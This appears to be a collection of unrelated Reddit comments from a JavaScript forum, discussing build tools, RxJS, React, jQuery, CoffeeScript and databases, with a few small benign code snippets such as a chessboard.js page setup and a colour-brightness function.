While I completely see your point, I think the reason that they did away with dependencies is because, as the article mentions, they led to far more problems than they solved. While this new solution might require a little more work, it covers more situations where things would need to be sequenced or consolidated. Wiping out a directory is a perfect example because you couldn't really do that using Gulp 3 unless you used the gulp-sequence plugin to ensure that a dependency had finished before moving on to another step. If you were trying to write files to a directory and included a directory cleaning dependency, the OS could still be deleting files even though gulp returns the task as completed and you end up with pipe errors. With the new system, you're ensuring that all tasks are completed in sequence and that a return is issued. For your particular situation, I'd reach out to the author or someone on the gulp team and see what solution they come up with. As I said, I think your solution probably lies in using conditional logic to run your tasks depending on where they're being called from. That's not to say that's the best way to do it, but it's definitely a solution.
RxJS attempts to be as spec-compliant as possible, and may be worth the slight performance penalty you'll have to pay over choosing Kefir. If you're concerned about file size, RxJS.lite might be a good option.
[Yes, but they differ in many other things.](http://vuejs.org/guide/comparison.html)
use a framework when you come across a difficult problem that you have trouble solving on your own, that the framework easily solves.
Wanted a rich content editor where you can add text/images with a "+" button. Similar to http://madebymany.github.io/sir-trevor-js/example.html 
Ah, nice! Thanks! I like that example with the cows string. It helps me think about the reasoning for using the different approaches.
I tried RxJS but found I liked Bacon.js better. The RxJS documentation seemed hinkey. Maybe because it is part of a family of Rx.whatevers for different languages. And, it just overall seemed over engineered and hard to use. YMMV
I thought the joke was "SQL is hard, let's go shopping!"
http://jade-lang.com/reference/code/ &gt; Unescaped buffered code starts with `!=` and outputs the result of evaluating the JavaScript expression in the template. != stuff 
read [javascript the good parts](http://shop.oreilly.com/product/9780596517748.do)
hehe good point.
It's about separating the actual small job from the task flow that requires it. It's a separation of concerns, essentially. Each job does this one thing, and it's up to a 'manager', 'supervisor', or 'task runner' to run each piece in correct order. Each individual piece doesn't care about anything else, and shouldn't.
I'm surprised to see that most people consider themselves full stack developers when it's imo more difficult than ever to master the full stack.
all hipster flame
that's kefir btw: https://rpominov.github.io/kefir/
Hey! Thanks for posting! Glad ya'll are liking Feathers. Feel free to stop on by slack.feathersjs.com if you haven't already. We're very friendly and would love to hear about what you build with Feathers.
Yes you can. You can even implement a whole new layer of architecture on top of it, whether it be unidirectional flow, MVC, or even data structures like queue and stack. That's how flexible it is. 
The difference is that rx is a library that you can use to the extent that you are comfortable with, while React is a framework that you need to conform to on the architectural level. 
&gt; Who ever said Marko didn't know what he was doing? /u/jodraws did, just there.
Just an ad for ruxit, barely discussed the issues at all. Not worth the read.
Because learning Reactive functional programming is not just learning a library but an entire new paradigm, it would be like asking people to learn OOP, 15 design patterns, SOLID principles and all that shit and say "Oh, it's just a library". It takes years to master OOP, or FP, and likely, it can take years to master FRP . It is not simple, at all. In the mean time I want to write apps, because i'm not paid to experiment with FRP. The actual payoff is also questionable on the long run. For FRP to be efficient you need to use a language that has FRP constructs . Javascript is not such a language. It's like wanting to do functional programming with Java pre-lambda version. It is insanely verbose.
[removed]
ex: if foo.bar p Heres some text: #{foo.bar} 
I think by far the main reason why it isn't used that often is because it doesn't really solve any big problem for JS devs. JavaScript can deal with asynchronous programming pretty well, expecially with the recent addition of async/await to the language. For 99% of the use cases RX simply won't give any significant advantage over async/await, but it does require you to restructure your entire code base, and then we're not even talking yet about how to use RX with external libraries. RX simply isn't the most attractive solution for async programming in JS.
What about [MobX](http://mobxjs.github.io/mobx/)? Has anyone giving it a shot?
Right alt + O doesn't do that. What keyboard layout I need to use to type that?
The two use cases you are naming make Me Want To use it right now!
Some tips :) - you can pass a canvas to the texture constructor and it will work with less memory overhead - this is an expensive approach, instead you may just want a 1x1 DataTexture filled with your preferred RGB value, and render a Plane at your specific size - or you can use RenderTexture for off screen stuff. Canvas -&gt; webgl upload is expensive and a memory hog 
O man, someone is going to make this an interview question. 
IMO you should aim to get something that's easily discoverable but also unique. How many drag libraries are on NPM? This one would be something like "drag-and-drop-8" which is worse. 
OOP &amp; Closures
I think that there's a little bit of a distinction between jQuery and Angular/React/Ember/etc. jQuery can operate in two modes. You can either use it mostly as an HTML-selection/manipulation tool, or you can use it more as a framework via it's plugin pattern. Angular, React, and its itinerant cohorts, are always whole hog frameworks. You can try to combine any of them, but in reality, if you do that, you are just asking for a hell of a lot of pain. There are some good arguments to be made for having jQuery in a plugin or library that is also intended to be consumed by Angular/React/Backbone/Ember, on the other hand. However, the author does make a good point that like anything in engineering, this should be used sparingly and is often abused. 
It's again about substance.io - already posted.
In the OP he didn't, but in this sub-thread he certainly did when trying to "defend" what the experience is.
Right back at ya.
it also makes it feel as though it's "semi-official" and people may adopt it based on that. eg: [standard](https://www.npmjs.com/package/standard)
Which will never be confused with the do instruction.
I'm curious, why do you say the it was _unavoidably_ huge? I'm just wondering since I write JavaScript for a fortune 50 company and neither I nor any of my coworkers used it. Why was it unavoidable for other people?
Can you explain more the "1x1 DataTexture" approach? Sounds interesting!
Does anyone know where the project files are being posted?
It's a regular expression. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions `exec` is a method of a regular expression instance https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/exec
Tightly coupled code is bad! Use my tightly coupled code instead!
Yes and it is awesome.
I said unavoidably because for a year or two, coffeescript was everywhere. You had everyone speaking positively of it, including [brendan eich](https://brendaneich.com/2011/01/harmony-of-my-dreams/), and a bunch of [random people on SO](http://stackoverflow.com/questions/2954557/has-anyone-used-coffeescript-for-a-production-application). Even little joke libraries had [coffeescript versions](https://github.com/mattdiamond/fuckitjs/blob/master/fuckit.coffee). It really took at least or two for people to get uncomfortable over some of the poor decisions in coffee and start to look elsewhere, particularly when ES6 stopped changing every other day and became more finalized. I don't think it ever really caught on with the huge companies, though. I never saw a company like walmart say they were using it, at least in the same way that they announced they were using node a few years later. I think the biggest company I saw was dropbox? Maybe that's why you never had much exposure to it. The affiliation it had with things like ruby on rails had people labeling it as "hipster tech" almost from the word go. 
The jquery people did a great job splitting up their offering. They have Sizzle.js, which is just the css query selector. jQuery, which has all the extra convenience code, and then jquery UI is the point where you get the framework.
You're thinking of using RxJS as a substitute for Redux. RxJS can do that, but it also does much more. Imagine you're writing a video game where multiple controllers can be plugged in and sequences of buttons can trigger a special move. This can be done fairly easily with RxJS but it doesn't even make sense to talk about Redux in this context.
Here's a link directly to the [video](https://www.youtube.com/watch?v=k88OIWJENgE). Hope you all enjoy! 
Very few people people even *approach* "mastering" the full stack. Most folks just have enough understanding of each layer to get things done/hacked together.
You would never use Python to write an OS, regardless of how comfortable you are with the language
Yes, they did a pretty good job splitting it up over the years, but aside from jQuery UI, I think there's also an assumption that the "plugin" pattern using jQuery itself becomes a sort of a framework, albeit really ad-hoc: i.e. $.fn.elementizer(), $.fn.xeditable(), or things like that. What I'm saying is you don't even have to go down that route, and still use "jQuery with all the extra convenience code" fairly responsibly in a library, if the library were doing a lot of heavy DOM manipulation. If you could cut it back to Sizzle, that would be best ( always limit your dependencies when you can ), but there's an argument there. I like vanilla JS but there's a lot of things jQuery just does a lot faster and cleaner, and it's odd but at this point you might even argue more people will recognize jQuery over JS. Server side is a whole different animal, and I really feel this criticism of libraries comes from that place. But on top of your JS Runtime, you also have your Browser embedding/implementation, and especially in that arena I really doubt we are going to see the standardization that server side enjoys because of the huge heaps of cash that people still dump into browsers. 
I don't see what this comment has to do with their post? Are you saying it's easier to write code in a language you're not comfortable in? Anyways, you could write an OS in Python. You'd just need to port the C standard library so you can compile Python for your custom OS. A lot of work, but not impossible.
&gt; function newLocation(){ &gt; var location = hunt_form.Location.toLowerCase(); &gt; var password = hunt_form.Password.toLowerCase(); &gt; if (location.value== "something") { &gt; if (password.value == "somepassword") Your local var's for location and password don't have a property "value", and per chreestopher2 your invocation of toLowerCase should be hunt_form.Location.value.toLowerCase() instead of hunt_form.Location.toLowerCase().
While clean and simple aggregations of NoSQL are handy, the biggest blocker I've had for adoption is the need to duplicate data to make up for the lack of joins so I can simplify my queries. Relational databases are still easier for me to wrap my head around in this sense, though they almost certainly cause more overhead in setup time. I recently dropped the use of firebase for a postgres database because I was wasting any time I saved in the setup time on querying data back out.
im pretty sure you dont want the entire form field , but rather the value from the form field... hunt_form.Location.value.toLowerCase() hunt_form.Password.value.toLowerCase();
&gt; Angular, React I think one is not like the other in this context.
How do you install it? Do you use `npm install -g` or `git clone` + `npm start`?
&gt; My hard work on the declarative view layer for canvas called e2d.js is not popular. It's probably because the world it creates is a tough one to swallow. Uh... okay.
I'm reminded of a joke I made long ago about writing device drivers in Java with JNI bridges, because I mean it's "write once, run anywhere" amirite?
`git clone` `npm install` `npm run start` or `npm run build:XXX`
Thanks! :D
&gt;You would never use Python to write an OS Challenge accepted.
Plain JavaScript is great for certain situations. JavaScript libraries are great for certain situations. Saying that "Plain JavaScript" or "JavaScript libraries" are always good/bad for every situation is absolutist and incorrect.
&gt; Thanks for reading Thanks for the lib
I find it sad that JavaScript development has gotten to the point where "pat me on the back" articles about writing scripts with no framework/library are okay. I'm not trying to be rude or cynical, I think it's awesome that he felt compelled to write native code (and an article). I just see way too many new JavaScript developers concern themselves with learning the hip new framework/library without learning what JavaScript truly is. I've found that developers who jump straight into a framework (be it React, Angular, etc.) have a much harder time building apps well. As a simple example, if a developer doesn't truly understand what an AJAX call is, what its doing, or how asynchronous code behaves, how will they be able to grasp how their model is updated with fresh new data from the backend? Short answer: **they won't**. But they probably will know what method from the framework is used to retrieve the data. Try taking one of these developers out of their comfort zone and have them write something natively. Sometimes it will go well. However, much too often will that developer crumble under their own ignorance of the environment they've built their career on. That's just my two cents. 
What a pointless comment. Of course people can do what they want. S/he was simply making a SUGGESTION for people to take into consideration.
Well I think one thing to consider is the origin of why a framework exists. For example react exists because it was a solution to a problem that Facebook had. I mean Facebook essentially has endless scrolling of content that is different for every user. Caching elements and modifying them directly will cause a memory leak once a user scrolls through their echo chamber long enough. So they essentially decided to keep a giant map of the dom and when a new set of data comes in, they check for changes, create a big HTML blob and then repaint. It's an awesome solution, so great that Angular just adopted the same strategy. But nothing makes me roll my eyes more is when someone does something like. "My God I need to make my blog in react!". Making a simple relatively static app in a framework like React is dumb both because it's actually less efficient on a small scale(all though you wouldn't be able to notice since it's not a fault of the framework its just 4 cached variables and 3 event listeners is simply tiny).But the main reason it's dumb is if you build a simple app with a framework built to power endless scrolls of Buzzfeed videos and food pictures, you won't even learn it's intended use. React is meant for ever changing , user specific and complex apps. So what I would say is don't use a framework unless you need to track a large number of objects, and objects that change dynamically. Frameworks only save time when something is large, otherwise using a framework for a simple app is like zigzagging through a barricade made for 500 people, but you're the only customer. Frameworks are meant to contain large masses of dynamic things, like a huge crowd at disney world. If you can just walk up and buy a ticket then do it, don't set up a barricade and then traverse through for no reason. 
I've already noticed some potential optimizations, and a PR will come shortly.
you have to chose between chessboard-0.3.0.js and chessboard-0.3.0.min.js. THey are the same file, but one is minimized. I also think the library uses jquery, so add that too. Here is the source from their example. Follow it and it should work! Make sure the file paths are correct. &lt;html&gt; &lt;head&gt; &lt;link rel="stylesheet" href="css/chessboard.css" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="board" style="width: 400px"&gt;&lt;/div&gt; &lt;script src="js/json3.min.js"&gt;&lt;/script&gt; &lt;script src="js/jquery-1.10.1.min.js"&gt;&lt;/script&gt; &lt;script src="js/chessboard.js"&gt;&lt;/script&gt; &lt;script&gt; var board = ChessBoard('board'); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;
I use and love standard, but people flip their shit at its name all the time. The top 2 complaints about standard are by far: 1. What, no semicolons? 2. It's not an actual standard so they must be lying/trying go trick me.
Thanks for your kind remarks! Making it useful for learning was entirely the point. It is starting to get unwieldy, but for now yes I think it works well this way. 
I got it working thanks bud
react-dnd is backed by a agnostic drag/drop backend, I believe. 
the main point of react seems to be self contained and reusable UI components that can be nested to form larger UI components that are also reusable... since you dont have side effects, you can pull out a single component and reuse it in either another project, or in another component in the same project, without having to worry about doing a ton of work (building shims, tracking state) to keep the component functional ... basically, the end result is an extremely modular way to build self contained, reusable UI components that operate independently of the rest of your app. The reason it is "not very popular in backend" is that its simply a view layer at its core.
[OP will surely deliver](http://i.imgur.com/GXVG87e.png)
Angular is a pretty formidable framework. Just out of curiosity what did you switch to?
thanks! I tried probably 4 or 5 different methods before I got a working one. 
Hey the timeline chart seems to broken (iOS Safari)
good, is it made with Electron?
In the [**index.js**](https://github.com/iiegor/chrome-material/blob/master/index.js) file, there is this: const ipc = require('electron').ipcRenderer; So it looks like it is.
If you're not changing a lot of things in the DOM very often, you can ignore React.
These seem like simple containers of data. I imagine they'd be more useful when coupled with browser APIs that use them (e.g. canvas 2D contexts). Are you aware of any?
Was in an interview today. Had this question
Protip: The W3C has a brightness formula for accessibility-minded developers. Use this to determine whether to make your font color black on light color backgrounds or white on darker backgrounds. Accessibility doesn't just mean someone is 100% blind or they are 100% not-blind. Some people just need a little help in the form of as much contrast as possible. Also some people without accessibility needs go out into the bright daylight from time to time and have to look at relatively dim screens. https://www.w3.org/TR/AERT#color-contrast /* R, G, &amp; B are integers from 0 to 255. */ function w3cBrightness(R, G, B) { return (((R * 299) + (G * 587) + (B * 114)) / 1000); } var fontColor = (w3cBrightness(R, G, B) &gt; 128) ? "black" : "white"; Question: But how do you get the RGB values for an arbitrary color like "limegreen"? Answer: Use a color parser. [This baby](http://www.phpied.com/rgb-color-parser-in-javascript/) can parse (and validate) any css color string like "orange", "rgb(20, 75, 66)", "hsl(...)", "#133337", etc. 
Oh look. Another framework.
Upvoted for adding to the convo, but I don't think that's what this article is about. He is very specifically talking about writing your libs so they're portable. People who write libs tend to not be new devs and tend be quite familiar with JS. However it is easy even for skilled devs to couple their lib to their preferred framework. However, when one day you switch frameworks or someone else wants to use the code they can't without a lot of work. Often times this is totally avoidable if you architect things from the start with no framework in mind.
What's the use case for this?
Seems like you can accomplish the same sort of thing with Server-Sent Events / EventSource. When would one use your library instead of an Event Source polyfill library? (Assuming of course you're in control of the server-side responses).
How does it compare to RxJs? Is there any similarities to Redux?
you had me at the quote from finnegan's wake
Why I've never heard of this glorious stuff before?
Hosted link: [Google Drive](https://googledrive.com/host/0B2y_dS5EVBNoRXRVU01yVDJCV28/)
You can render it in the backend too if you want, using something like koa. But yeah, the objection makes no sense. If you think of backends as doing things like providing apis... well, that's not what React does.
It's also broken on Firefox.
Great article. I do agree plain JS is sometimes just amazing. As a side note, we're working on building a product to simplify javascript apps. It would be great to just get some thoughts on what you guys love (or hate) about building and scaling production JS apps. Check out zeniface.com or ping me at support@zeniface.com
its school project cant use framework
In your eample you are drawing a 100x100 red canvas. Presumably to have it appear on screen with WebGL you would use a cube, plane, or something with a MeshBasicMaterial using that texture. Instead, you could just use a 1x1 0xff0000 DataTexture, and you would have the same results but with much less memory overhead. :) 
That's helpfull
The source code is at https://github.com/easystatic/easystatic
Hey - thanks for pointing this out! I'll check it out and post back when it's fixed. UPDATE: The timeline example on the site used dates in a format not supported by Safari. The example has since been updated and should be working correctly. 
How does this compare to [prelude ls](http://www.preludels.com/)? Without the language support for function piping or composition, were these added to prototypes for more natural chaining? Some of the idioms I don't see applying very well at all, but javascript developers are already used to things like monads in the context of promises. 
Well, if you want to be technical about it, redux's paradigm is applying a reducer over a state monad. This is pretty much the way functional web servers work, though they might prefer to compose functions instead of reducing them. Side effects aren't the source of all bugs. The reason why they are considered "bad" is it makes it harder to reason about what your code will do - consider: let count = 0; let inc = () =&gt; count++; let dec = () =&gt; count--; let getCount = () =&gt; count; Now, suppose you call `inc` and `getCount`. What would the result be? You might say `1`, but this would only be true if *no other part of the application had used this yet*. If I had called `dec` before I allowed you to call `inc`, then when you called `getCount`, you'd get back `0`, and it'd be unclear if the code even worked at all. Whereas: let inc = x =&gt; x + 1; let dec = x =&gt; x - 1; No matter how hard you try here, if you call `inc(0)` you will *always* get back `1`. You can have the utmost confidence that this code will always be well-behaved. Logically, if you build up your app from things that are always well-behaved, then your app can only be well-behaved. We've always known side-effects were a problem with global state. Functional programming just takes it one step further and attempts to eliminate class state as well. 